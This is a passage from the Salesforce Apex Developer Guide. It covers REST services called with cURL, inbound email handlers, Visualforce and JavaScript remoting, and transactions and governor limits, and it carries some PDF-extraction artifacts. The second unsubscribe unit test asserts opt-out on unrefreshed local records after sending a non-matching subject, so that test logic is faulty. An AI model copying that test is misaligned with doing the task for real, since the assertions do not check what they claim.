         String accountId = req.requestURI.substring(req.requestURI.lastIndexOf('/')+1);

          Account result = [SELECT Id, Name, Phone, Website FROM Account WHERE Id =

     :accountId];

          return result;

       }

      @HttpPost

```


Apex Developer Guide Invoking Apex

```
       global static String doPost(String name,

          String phone, String website) {

          Account account = new Account();

          account.Name = name;

          account.phone = phone;

          account.website = website;

          insert account;

          return account.Id;

       }

     }

```

**2.** To call the `doGet` method from a client, open a command-line window and execute the following `cURL` command to retrieve
an account by ID:

```
    curl -H "Authorization: Bearer sessionId "

    "https:// instance .salesforce.com/services/apexrest/Account/ accountId "

```

**•** Replace _`sessionId`_ with the `<sessionId>` element that you noted in the login response.

**•** Replace _`instance`_ with your `<serverUrl>` element.

**•** Replace _`accountId`_ with the ID of an account which exists in your organization.

After calling the `doGet` method, Salesforce returns a JSON response with data such as the following:

```
     {

      "attributes" :

       {

         "type" : "Account",

         "url" : "/services/data/v22.0/sobjects/Account/ accountId "

       },

      "Id" : " accountId ",

      "Name" : "Acme"

     }

```

Note: The `cURL` examples in this section don't use a namespaced Apex class so you don’t see the namespace in the URL.

**3.** Create a file called `account.txt` to contain the data for the account you will create in the next step.

```
     {

      "name" : "Wingo Ducks",

      "phone" : "707-555-1234",

      "website" : "www.wingo.ca.us"

     }

```

**4.** Using a command-line window, execute the following `cURL` command to create a new account:

```
    curl -H "Authorization: Bearer sessionId " -H "Content-Type: application/json" -d

    @account.txt "https:// instance .salesforce.com/services/apexrest/Account/"

```

After calling the `doPost` method, Salesforce returns a response with data such as the following:

```
     " accountId "

```

The _`accountId`_ is the ID of the account you just created with the POST request.

**5.** Using a command-line window, execute the following `cURL` command to delete an account by specifying the ID:


Apex Developer Guide Invoking Apex

```
    curl —X DELETE —H "Authorization: Bearer sessionId "

    "https:// instance .salesforce.com/services/apexrest/Account/ accountId "

###### Apex REST Code Sample Using RestRequest

```

This sample shows you how to add an attachment to a record by using the RestRequest object.

For more information about authenticating with `cURL` [, see the Quick Start section of the](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_rest.meta/api_rest/quickstart.htm) _REST API Developer Guide_ . In this code, the
binary file data is stored in the RestRequest object, and the Apex service class accesses the binary data in the RestRequest object .

**1.** Create an Apex class in your org from Setup by entering _`Apex Classes`_ in the `Quick Find` box, then selecting **Apex Classes** .
Click **New** and add the following code to your new class:

```
     @RestResource(urlMapping='/CaseManagement/v1/*')

     global with sharing class CaseMgmtService

     {

       @HttpPost

       global static String attachPic(){

          RestRequest req = RestContext.request;

          RestResponse res = Restcontext.response;

          Id caseId = req.requestURI.substring(req.requestURI.lastIndexOf('/')+1);

          Blob picture = req.requestBody;

          Attachment a = new Attachment (ParentId = caseId,

                            Body = picture,

                            ContentType = 'image/jpg',

                            Name = 'VehiclePicture');

          insert a;

          return a.Id;

       }

     }

```

**2.** Open a command-line window and execute the following `cURL` command to upload the attachment to a case:

```
    curl -H "Authorization: Bearer sessionId " -H "X-PrettyPrint: 1" -H "Content-Type:

    image/jpeg" --data-binary @ file

    "https:// MyDomainName .my.salesforce.com/services/apexrest/CaseManagement/v1/ caseId "

```

**•** Replace _`sessionId`_ with the `<sessionId>` element that you noted in the login response.

**•** Replace _`MyDomainName`_ with the My Domain name for your org.

**•** Replace _`caseId`_ with the ID of the case you want to add the attachment to.

**•** Replace _`file`_ with the path and file name of the file you want to attach.

Your command should look something like this (with the _`sessionId`_ replaced with your session ID and _`MyDomainName`_
replaced with the My Domain Name for your org):

```
     curl -H "Authorization: Bearer sessionId "

     -H "X-PrettyPrint: 1" -H "Content-Type: image/jpeg" --data-binary

     @c:\test\vehiclephoto1.jpg

     "https:// MyDomainName .my.salesforce.com/services/apexrest/CaseManagement/v1/500D0000003aCts"

```

Note: The `cURL` examples in this section don’t use a namespaced Apex class so you won’t see the namespace in the URL.


Apex Developer Guide Invoking Apex

The Apex class returns a JSON response that contains the attachment ID such as the following:

```
     "00PD0000001y7BfMAI"

```

**3.** To verify that the attachment and the image were added to the case, navigate to **Cases** and select the **All Open Cases** view. Click
on the case and then scroll down to the Attachments related list. You should see the attachment you just created.

#### Apex Email Service

You can use email services to process the contents, headers, and attachments of inbound email. For example, you can create an email
service that automatically creates contact records based on contact information in messages.

You can associate each email service with one or more Salesforce-generated email addresses to which users can send messages for
processing. To give multiple users access to a single email service, you can:

**•** Associate multiple Salesforce-generated email addresses with the email service and allocate those addresses to users.

**•** Associate a single Salesforce-generated email address with the email service, and write an Apex class that executes according to the
user accessing the email service. For example, you can write an Apex class that identifies the user based on the user's email address
and creates records on behalf of that user.

To use email services, from Setup, enter _`Email Services`_ in the `Quick Find` box, then select **Email Services** .

**•** Click **New Email Service** to define a new email service.

**•** Select an existing email service to view its configuration, activate or deactivate it, and view or specify addresses for that email service.

**•** Click **Edit** to make changes to an existing email service.

**•** Click **Delete** to delete an email service.

Note: Before deleting email services, you must delete all associated email service addresses.

When defining email services, note the following:

**•** An email service only processes messages it receives at one of its addresses.

**•** Salesforce limits the total number of messages that all email services combined, including On-Demand Email-to-Case, can process
daily. Messages that exceed this limit are bounced, discarded, or queued for processing the next day, depending on how you
configure the failure response settings for each email service. Salesforce calculates the limit by multiplying the number of user
licenses by 1,000; maximum 1,000,000. For example, if you have 10 licenses, your org can process up to 10,000 email messages a
day.

**•** Email service addresses that you create in your sandbox can’t be copied to your production org.

**•** For each email service, you can tell Salesforce to send error email messages to a specified address instead of the sender's email
address.

**•** Email services reject email messages and notify the sender if the email (combined body text, body HTML, and attachments) exceeds
approximately 25 MB (varies depending on language and character set).

#### Using the InboundEmail Object

For every email the Apex email service domain receives, Salesforce creates a separate InboundEmail object that contains the contents
and attachments of that email. You can use Apex classes that implement the `Messaging.InboundEmailHandler` interface
to handle an inbound email message. Using the `handleInboundEmail` method in that class, you can access an InboundEmail
object to retrieve the contents, headers, and attachments of inbound email messages, as well as perform many functions.


Apex Developer Guide Invoking Apex

Example 1: Create Tasks for Contacts

The following is an example of how you can look up a contact based on the inbound email address and create a new task.

```
   public with sharing class CreateTaskEmailExample implements Messaging.InboundEmailHandler

    {

     public Messaging.InboundEmailResult handleInboundEmail(Messaging.inboundEmail email,

                                    Messaging.InboundEnvelope env){

      // Create an InboundEmailResult object for returning the result of the

      // Apex Email Service

      Messaging.InboundEmailResult result = new Messaging.InboundEmailResult();

      String myPlainText= '';

      // Add the email plain text into the local variable

      myPlainText = email.plainTextBody;

      // New Task object to be created

      Task[] newTask = new Task[0];

      // Try to look up any contacts based on the email from address

      // If there is more than one contact with the same email address,

      // an exception will be thrown and the catch statement will be called.

      try {

       Contact vCon = [SELECT Id, Name, Email

        FROM Contact

        WHERE Email = :email.fromAddress

        WITH USER_MODE

        LIMIT 1];

       // Add a new Task to the contact record we just found above.

       newTask.add(new Task(Description = myPlainText,

          Priority = 'Normal',

          Status = 'Inbound Email',

          Subject = email.subject,

          IsReminderSet = true,

          ReminderDateTime = System.now()+1,

          WhoId = vCon.Id));

      // Insert the new Task

      insert as user newTask;

      System.debug('New Task Object: ' + newTask );

      }

      // If an exception occurs when the query accesses

      // the contact record, a QueryException is called.

      // The exception is written to the Apex debug log.

     catch (QueryException e) {

        System.debug('Query Issue: ' + e);

     }

     // Set the result to true. No need to send an email back to the user

     // with an error message

```


Apex Developer Guide Invoking Apex

```
     result.success = true;

     // Return the result for the Apex Email Service

     return result;

     }

   }

```

Example 2: Handle Unsubscribe Email

Companies that send marketing email to their customers and prospects must provide a way to let the recipients unsubscribe. The
following is an example of how an email service can process unsubscribe requests. The code searches the subject line of inbound email
for the word “unsubscribe.” If the word is found, the code finds all contacts and leads that match the From email address and sets the
`Email Opt Out` field ( `HasOptedOutOfEmail` ) to True.

```
   public with sharing class unsubscribe implements Messaging.inboundEmailHandler{

      public Messaging.InboundEmailResult handleInboundEmail(Messaging.InboundEmail email,

                  Messaging.InboundEnvelope env ) {

        // Create an inboundEmailResult object for returning

        // the result of the email service.

        Messaging.InboundEmailResult result = new Messaging.InboundEmailResult();

        // Create contact and lead lists to hold all the updated records.

        List<Contact> lc = new List <contact>();

        List<Lead> ll = new List <lead>();

        // Convert the subject line to lower case so the program can match on lower case.

        String mySubject = email.subject.toLowerCase();

        // The search string used in the subject line.

        String s = 'unsubscribe';

        // Check the variable to see if the word "unsubscribe" was found in the subject

   line.

        Boolean unsubMe;

        // Look for the word "unsubcribe" in the subject line.

        // If it is found, return true; otherwise, return false.

        unsubMe = mySubject.contains(s);

         // If unsubscribe is found in the subject line, enter the IF statement.

        if (unsubMe == true) {

           try {

           // Look up all contacts with a matching email address.

           for (Contact c : [SELECT Id, Name, Email, HasOptedOutOfEmail

                   FROM Contact

                   WHERE Email = :env.fromAddress

                   AND hasOptedOutOfEmail = false

                   WITH USER_MODE

```


Apex Developer Guide Invoking Apex

```
                   LIMIT 100]) {

             // Add all the matching contacts into the list.

             c.hasOptedOutOfEmail = true;

             lc.add(c);

           }

           // Update all of the contact records.

           update as user lc;

        }

        catch (System.QueryException e) {

           System.debug('Contact Query Issue: ' + e);

        }

        try {

           // Look up all leads matching the email address.

           for (Lead l : [SELECT Id, Name, Email, HasOptedOutOfEmail

                FROM Lead

                WHERE Email = :env.fromAddress

                AND isConverted = false

                AND hasOptedOutOfEmail = false

                WITH USER_MODE

                LIMIT 100]) {

             // Add all the leads to the list.

             l.hasOptedOutOfEmail = true;

             ll.add(l);

             System.debug('Lead Object: ' + l);

           }

           // Update all lead records in the query.

           update as user ll;

        }

        catch (System.QueryException e) {

           System.debug('Lead Query Issue: ' + e);

        }

        System.debug('Found the unsubscribe word in the subject line.');

         }

         else {

           System.debug('No Unsuscribe word found in the subject line.' );

         }

        // Return True and exit.

        // True confirms program is complete and no emails

        // should be sent to the sender of the unsubscribe request.

        result.success = true;

        return result;

      }

   }

   @isTest

   private class unsubscribeTest {

      // The following test methods provide adequate code coverage

      // for the unsubscribe email class.

      // There are two methods, one that does the testing

```


Apex Developer Guide Invoking Apex

```
      // with a valid "unsubcribe" in the subject line

      // and one the does not contain "unsubscribe" in the

      // subject line.

      static testMethod void testUnsubscribe() {

        // Create a new email and envelope object.

        Messaging.InboundEmail email = new Messaging.InboundEmail() ;

        Messaging.InboundEnvelope env = new Messaging.InboundEnvelope();

        // Create a new test lead and insert it in the test method.

        Lead l = new lead(firstName='John',

             lastName='Smith',

             Company='Salesforce',

             Email='user@acme.com',

             HasOptedOutOfEmail=false);

        insert l;

        // Create a new test contact and insert it in the test method.

        Contact c = new Contact(firstName='john',

               lastName='smith',

               Email='user@acme.com',

               HasOptedOutOfEmail=false);

        insert c;

        // Test with the subject that matches the unsubscribe statement.

        email.subject = 'test unsubscribe test';

        env.fromAddress = 'user@acme.com';

        // Call the class and test it with the data in the testMethod.

        unsubscribe unsubscribeObj = new unsubscribe();

        unsubscribeObj.handleInboundEmail(email, env );

      }

      static testMethod void testUnsubscribe2() {

        // Create a new email and envelope object.

        Messaging.InboundEmail email = new Messaging.InboundEmail();

        Messaging.InboundEnvelope env = new Messaging.InboundEnvelope();

        // Create a new test lead and insert it in the test method.

        Lead l = new lead(firstName='john',

             lastName='smith',

             Company='Salesforce',

             Email='user@acme.com',

             HasOptedOutOfEmail=false);

        insert l;

        // Create a new test contact and insert it in the test method.

        Contact c = new Contact(firstName='john',

               lastName='smith',

               Email='user@acme.com',

               HasOptedOutOfEmail=false);

        insert c;

```


Apex Developer Guide Invoking Apex

```
        // Test with a subject that does not contain "unsubscribe."

        email.subject = 'test';

        env.fromAddress = 'user@acme.com';

        // Call the class and test it with the data in the test method.

        unsubscribe unsubscribeObj = new unsubscribe();

        unsubscribeObj.handleInboundEmail(email, env );

        // Assert that the Lead and Contact have been unsubscribed

        Lead updatedLead = [Select Id, HasOptedOutOfEmail from Lead where Id = :l.Id];

        Contact updatedContact = [Select Id, HasOptedOutOfEmail from Contact where Id =

   :c.Id];

        Assert.isTrue(l.HasOptedOutOfEmail);

        Assert.isTrue(c.HasOptedOutOfEmail);

      }

   }

```

SEE ALSO:

_Apex Reference Guide_ [: InboundEmail Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_classes_email_inbound_inbound.htm)

_Apex Reference Guide_ [: InboundEnvelope Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_classes_email_inbound_envelope.htm)

_Apex Reference Guide_ [: InboundEmailResult Class](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_classes_email_inbound_result.htm)

#### Visualforce Classes

In addition to giving developers the ability to add business logic to Salesforce system events such as button clicks and related record
updates, Apex can also be used to provide custom logic for Visualforce pages through custom Visualforce controllers and controller
extensions.

**•** A custom controller is a class written in Apex that implements all of a page's logic, without leveraging a standard controller. If you
use a custom controller, you can define new navigation elements or behaviors, but you must also reimplement any functionality
that was already provided in a standard controller.

Like other Apex classes, both standard and custom controllers execute entirely in user mode, in which the object and field-level
permissions of the current user are enforced.

**•** A controller extension is a class written in Apex that adds to or overrides behavior in a standard or custom controller. Extensions
allow you to leverage the functionality of another controller while adding your own custom logic.

You can use these system-supplied Apex classes when building custom Visualforce controllers and controller extensions.

**•** Action

**•** Dynamic Component

**•** IdeaStandardController

**•** IdeaStandardSetController

**•** KnowledgeArticleVersionStandardController

**•** Message

**•** PageReference

**•** SelectOption

**•** StandardController

**•** StandardSetController


Apex Developer Guide Invoking Apex

In addition to these classes, the `transient` keyword can be used when declaring methods in controllers and controller extensions.
For more information, see Using the `transient` Keyword on page 89.

For more information on Visualforce, see the _[Visualforce Developer Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.pages.meta/pages/)_ .

#### JavaScript Remoting

Use JavaScript remoting in Visualforce to call methods in Apex controllers from JavaScript. Create pages with complex, dynamic behavior
that isn’t possible with the standard Visualforce AJAX components.

Features implemented using JavaScript remoting require three elements:

**•** The remote method invocation you add to the Visualforce page, written in JavaScript.

**•** The remote method definition in your Apex controller class. This method definition is written in Apex, but there are some important
differences from normal action methods.

**•** The response handler callback function you add to or include in your Visualforce page, written in JavaScript.

In your controller, your Apex method declaration is preceded with the `@RemoteAction` annotation like this:

```
   @RemoteAction

   global static String getItemId(String objectName) { ... }

```

Apex `@RemoteAction` methods must be `static` and either `global` or `public` .

Add the Apex class as a custom controller or a controller extension to your page.

```
   <apex:page controller="MyController" extension="MyExtension">

```

Warning: Adding a controller or controller extension grants access to all `@RemoteAction` methods in that Apex class, even
if those methods aren’t used in the page. Anyone who can view the page can execute all `@RemoteAction` methods and
provide fake or malicious data to the controller.

Then, add the request as a JavaScript function call. A simple JavaScript remoting invocation takes the following form.

```
   [ namespace .] MyController . method (

      [parameters...,]

     callbackFunction,

      [configuration]

   );

```

**Table 7: Remote Request Elements**


Apex Developer Guide Invoking Apex

For more information, see _JavaScript Remoting for Apex Controllers_ in the _Visualforce Developer's Guide_ .

#### Apex in AJAX

The AJAX toolkit includes built-in support for invoking Apex through anonymous blocks or public `webservice` methods.

To invoke Apex through anonymous blocks or public `webservice` methods, include the following lines in your AJAX code:

```
   <script src="/soap/ajax/67.0/connection.js" type="text/javascript"></script>

   <script src="/soap/ajax/67.0/apex.js" type="text/javascript"></script>

```

Note: For AJAX buttons, use the alternate forms of these includes.

To invoke Apex, use one of the following two methods:

**•** Execute anonymously via `sforce.apex.executeAnonymous (` _**`script`**_ `)` . This method returns a result similar to the API's
result type, but as a JavaScript structure.

**•** Use a class WSDL. For example, you can call the following Apex class:

```
     global class myClass {

      webservice static Id makeContact(String lastName, Account a) {

          Contact c = new Contact(LastName = lastName, AccountId = a.Id);

          return c.id;

       }

     }

```

By using the following JavaScript code:

```
     var account = sforce.sObject("Account");

     var id = sforce.apex.execute("myClass","makeContact",

                      {lastName:"Smith",

                       a:account});

```

The `execute` method takes primitive data types, sObjects, and lists of primitives or sObjects.

To call a webservice method with no parameters, use `{}` as the third parameter for `sforce.apex.execute` . For example, to
call the following Apex class:

```
     global class myClass{

       webservice static String getContextUserName() {

          return UserInfo.getFirstName();

       }

     }

```

Use the following JavaScript code:

```
     var contextUser = sforce.apex.execute("myClass", "getContextUserName", {});

```


### Apex Developer Guide Apex Transactions and Governor Limits

Note: If a namespace has been defined for your organization, you must include it in the JavaScript code when you invoke
the class. For example, to call the _`myClass`_ class, the JavaScript code from above would be rewritten as follows:

```
       var contextUser = sforce.apex.execute("myNamespace.myClass", "getContextUserName",

        {});

```

To verify whether your organization has a namespace, log in to your Salesforce organization and from Setup, enter _`Packages`_
in the `Quick Find` box, then select **Packages** . If a namespace is defined, it’s listed under Developer Settings.

[For more information on the return datatypes, see Data Types in AJAX Toolkit](https://developer.salesforce.com/docs/atlas.en-us.262.0.ajax.meta/ajax/sforce_api_ajax_datatypes.htm)

Use the following line to display a window with debugging information:

```
   sforce.debug.trace=true;

### Apex Transactions and Governor Limits

```

Apex Transactions ensure the integrity of data. Apex code runs as part of atomic transactions. Governor execution limits ensure the
efficient use of resources on the Lightning Platform multitenant platform.

Most of the governor limits are per transaction, and some aren’t, such as 24-hour limits.

To make sure Apex adheres to governor limits, certain design patterns should be used, such as bulk calls and foreign key relationships
in queries.

### Apex Transactions

An _Apex transaction_ represents a set of operations that are executed as a single unit. All DML operations in a transaction must complete
successfully. If an error occurs in one operation, the entire transaction is rolled back and no data is committed to the database. The
boundary of a transaction can be a trigger, a class method, an anonymous block of code, a Visualforce page, or a custom Web service
method.

Execution Governors and Limits
Because Apex runs in a multitenant environment, the Apex runtime engine strictly enforces limits so that runaway Apex code or
processes don’t monopolize shared resources. If some Apex code exceeds a limit, the associated governor issues a runtime exception
that can’t be handled.

Elastic Limits for Asynchronous Apex Jobs (Beta)
To help avoid disruptions to your workflow, enable elastic limits for asynchronous Apex jobs (beta). The setting supports throttled
processing of asynchronous jobs above the standard daily limit, which prevents execution failures and limit exceptions if your org
reaches or exceeds this limit.

Set Up Governor Limit Email Warnings
You can specify users in your organization to receive an email notification when they invoke Apex code that surpasses 50% of
allocated governor limits. Only per-request limits are checked for sending email warnings; per-org limits like concurrent long-running
requests are not checked. These email notifications do not count against the daily single email limit.

Running Apex within Governor Execution Limits
When you develop software in a multitenant cloud environment such as the Lightning platform, you don’t have to scale your code,
because the Lightning platform does it for you. Because resources are shared in a multitenant platform, the Apex runtime engine
enforces some limits to ensure that no one transaction monopolizes shared resources.


#### Apex Developer Guide Apex Transactions and Governor Limits Apex Transactions

An _Apex transaction_ represents a set of operations that are executed as a single unit. All DML operations in a transaction must complete
successfully. If an error occurs in one operation, the entire transaction is rolled back and no data is committed to the database. The
boundary of a transaction can be a trigger, a class method, an anonymous block of code, a Visualforce page, or a custom Web service
method.

Note: Payments transactions are the exception to DML operation errors. Even if an error occurs, data is committed and payment
records are generated because the transaction has already happened at the payment gateway.

All operations that occur inside the transaction boundary represent a single unit of operations, including calls to external code, such as
classes or triggers that run in the transaction boundary. For example: a custom Apex Web service method causes a trigger to fire, which
in turn calls a method in a class. In this case, all changes are committed to the database only after all operations in the transaction finish
executing and don’t cause any errors. If an error occurs in any of the intermediate steps, all database changes are rolled back and the
transaction isn’t committed.

An Apex transaction is sometimes referred to as an execution context. This guide uses the term Apex transaction.

How are Transactions Useful?

Transactions are useful when several operations are related, and either all or none of the operations are committed. The goal is to keep
the database in a consistent state. There are many business scenarios that benefit from transaction processing. For example, transferring
funds from one bank account to another is a common scenario. It involves debiting the first account and crediting the second account
with the amount to transfer. These two operations must be committed together to the database. If the debit operation succeeds and
the credit operation fails, the account balances become inconsistent.

Example

This example shows how all DML `insert` operations in a method are rolled back when the last operation causes a validation rule
failure. In this example, the `invoice` method is the transaction boundary—all code that runs within this method either commits all
changes to the platform database or rolls back all changes. In this case, we add an invoice statement with a line item for the pencils
merchandise. The Line Item is for a purchase of 5,000 pencils specified in the Units_Sold__c field, which is more than the entire pencils
inventory of 1,000. This example assumes a validation rule has been set up to check that the total inventory of the merchandise item is
enough to cover new purchases.

Since this example attempts to purchase more pencils (5,000) than items in stock (1,000), the validation rule fails and throws an exception.
Code execution halts at this point and all DML operations processed before this exception are rolled back. The invoice statement and
the line item aren’t added to the database, and their `insert` DML operations are rolled back.

In the Developer Console, execute the static `invoice` method.

```
   // Only 1,000 pencils are in stock.

   // Purchasing 5,000 pencils cause the validation rule to fail,

   // which results in an exception in the invoice method.

   Id invoice = MerchandiseOperations.invoice('Pencils', 5000, 'test 1');

```

This definition is the `invoice` method. The update of total inventory causes an exception due to the validation rule failure. As a result,
the invoice statements and line items are rolled back and aren’t inserted into the database.

```
   public class MerchandiseOperations {

      public static Id invoice( String pName, Integer pSold, String pDesc) {

        // Retrieve the pencils sample merchandise

        Merchandise__c m = [SELECT Price__c,Total_Inventory__c

           FROM Merchandise__c WHERE Name = :pName LIMIT 1];

        // break if no merchandise is found

```


Apex Developer Guide Apex Transactions and Governor Limits

```
        System.assertNotEquals(null, m);

        // Add a new invoice

        Invoice_Statement__c i = new Invoice_Statement__c(

           Description__c = pDesc);

        insert i;

        // Add a new line item to the invoice

        Line_Item__c li = new Line_Item__c(

           Name = '1',

           Invoice_Statement__c = i.Id,

           Merchandise__c = m.Id,

           Unit_Price__c = m.Price__c,

           Units_Sold__c = pSold);

        insert li;

        // Update the inventory of the merchandise item

        m.Total_Inventory__c -= pSold;

        // This causes an exception due to the validation rule

        // if there is not enough inventory.

        update m;

        return i.Id;

      }

   }

#### Execution Governors and Limits

```

Because Apex runs in a multitenant environment, the Apex runtime engine strictly enforces limits so that runaway Apex code or processes
don’t monopolize shared resources. If some Apex code exceeds a limit, the associated governor issues a runtime exception that can’t
be handled.

The Apex limits, or _governors_, track, and enforce the statistics outlined in the following tables and sections.

**•** Per-Transaction Apex Limits

**•** Per-Transaction Certified Managed Package Limits

**•** Salesforce Platform Apex Limits

**•** Static Apex Limits

**•** Size-Specific Apex Limits

**•** Miscellaneous Apex Limits

In addition to the core Apex governor limits, email limits and push notification limits are also included later in this topic for your
convenience.

Per-Transaction Apex Limits

These limits count for each Apex transaction. For Batch Apex, these limits are reset for each execution of a batch of records in the
`execute` method.

This table lists limits for synchronous Apex and asynchronous Apex (Batch Apex and future methods) when they’re different. Otherwise,
this table lists only one limit that applies to both synchronous and asynchronous Apex.

Note:

**•** Although scheduled Apex is an asynchronous feature, synchronous limits apply to scheduled Apex jobs.


Apex Developer Guide Apex Transactions and Governor Limits

**•** For Bulk API and Bulk API 2.0 transactions, the effective limit is the higher of the synchronous and asynchronous limits. For
example, the maximum number of Bulk Apex jobs added to the queue with `System.enqueueJob` is the synchronous
limit (50), which is higher than the asynchronous limit (1).

**Description** **Synchronous** **Asynchronous**
**Limit** **Limit**

Total number of SOQL queries issued [1] 100 200

Total number of records retrieved by SOQL queries 50,000 50,000

Total number of records retrieved by `Database.getQueryLocator` 10,000 10,000

Total number of SOSL queries issued 20 20

Total number of records retrieved by a single SOSL query 2,000 2,000

Total number of DML statements issued [2] 150 150

Total number of records processed as a result of DML statements, `Approval.process`, 10,000 10,000
or `database.emptyRecycleBin`

Total stack depth for any Apex invocation that recursively fires triggers due to `insert`, 16 16

`update`, or `delete` statements [3]

Total number of callouts (HTTP requests or web services calls) in a transaction 100 100

Maximum cumulative timeout for all callouts (HTTP requests or Web services calls) in a 120 seconds 120 seconds
transaction

Maximum number of methods with the `future` annotation allowed per Apex invocation 50 0 in batch and
future contexts; 50

in queueable
context

